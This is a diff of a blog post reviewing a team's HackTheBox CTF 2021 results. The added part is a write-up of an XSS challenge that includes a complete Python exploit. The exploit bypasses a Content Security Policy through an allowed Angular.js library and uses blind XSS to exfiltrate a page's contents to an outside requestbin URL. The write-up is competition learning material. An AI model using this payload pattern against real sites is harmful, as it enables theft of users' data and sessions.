@@ -1,16 +1,16 @@
 ﻿---
 layout: post
 title: HackTheBox CTF 2021
-excerpt: "My team and I competed in HackTheBox's CTF Cyber Apocolypse and we got 189th place out of 4740 teams (top 3.99%). I focused mainly on crypto and helped my team occasionally in other categories."
+excerpt: "My team and I competed in HackTheBox's CTF Cyber Apocolypse and we got 189th place out of 4740 teams worldwide (top 3.99%). Amongst US teams, we were top 40. I focused mainly on crypto and helped my team occasionally in other categories."
 categories: [competition]
 tags: [hackthebox, ctf, review]
 ---
 
 ## Overview
 
-1. [Thoughts and Review](#Thoughts-and-Review)
-2. [Crypto Challenges](#Cypto-Challenges)
-3. [Other Challenges](#Other-Challenges)
+1. [Thoughts and Review](#thoughts-and-review)
+2. [Crypto Challenges](#cypto-challenges)
+3. [Other Challenges](#other-challenges)
 
 ## Thoughts and Review
 
@@ -37,10 +37,10 @@ Final score: 9/10
 ## Crypto Challenges
 I did get stuck on a couple of the Crypto challenges, but I was able to complete a handful of them. The challenges were as follows:
 * [Nintendo Base64](#Nintendo-Base64)
-* [Phasestream 1](#Phasestream-1)
-* [Phasestream 2](#Phasestream-2)
-* [Phasestream 3](#Phasestream-3)
-* [Phasestream 4](#Phasestream-4)
+* [Phasestream 1](#phasestream-1)
+* [Phasestream 2](#phasestream-2)
+* [Phasestream 3](#phasestream-3)
+* [Phasestream 4](#phasestream-4)
 
 
 
@@ -204,3 +204,43 @@ I noticed that the quiz had 2 options when connected to: '1' to see the emoji va
 
 ##### The script my team made together:
 <script src="https://gist.github.com/dbaseqp/397de1a5620d5ddfc1fa94a497df6a68.js"></script>
+
+### The Galactic Times
+
+This challenge had a feedback form that was vulnerable to XSS. My teammate, NoSecurity, figured out the technical solution for this challenge, so you should check out [his blogpost about HTBCTF](https://nosecurity.blog/) for more details.
+
+#### My part
+In short, we had to avoid a CSP to use blind XSS and exfiltrate the flag. 
+
+From the given code of the site, we knew that there was a CSP that is supposed to block XSS, however, it specifically does allow an Angular JS library. After NoSecurity set up the exploit script, I wrote the JS payload that sent a XML HTTP request to the page with the flag, searched the response for the part containing the flag, and returned it to our request bin.
+
+##### Our exploit:
+
+```
+import requests
+
+# Exploit settings
+target_ip = '138.68.181.43:30419'
+target_endpoint = '/api/submit'
+target_url = 'http://' + target_ip + target_endpoint
+cloudflare_vulnerable_url = 'https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js'
+
+# Sensitive page to retrieve
+loot_page = '/alien'
+loot_url = '/' + loot_page
+
+# JS Payload
+request_bin = 'https://requestbin.io/1m536do1?'
+flag = 'flag'
+exfil1 = 'fetch(\\"/alien\\")'
+js_payload = 'var xmlHttp = new XMLHttpRequest();xmlHttp.open(\\"GET\\",\\"' + loot_page + '\\",false);xmlHttp.send();document.location=\\"' + request_bin + '\\" + xmlHttp.responseText.substring((xmlHttp.responseText).search(\\"CHTB{\\"),(xmlHttp.responseText).search(\\"}\\")+1)'
+
+csp_bypass = '<script src=\\"' + cloudflare_vulnerable_url + '\\"></script><K Ng-App>{{$new.constructor(\'' + js_payload + '\')()}}'
+
+post_data = '{\"feedback\":\"' + csp_bypass + '\"}'
+post_headers = {'Content-Type':'application/json'}
+post_request = requests.post(target_url, data = post_data, headers = post_headers)
+
+print(csp_bypass)
+print(post_request.text)
+```
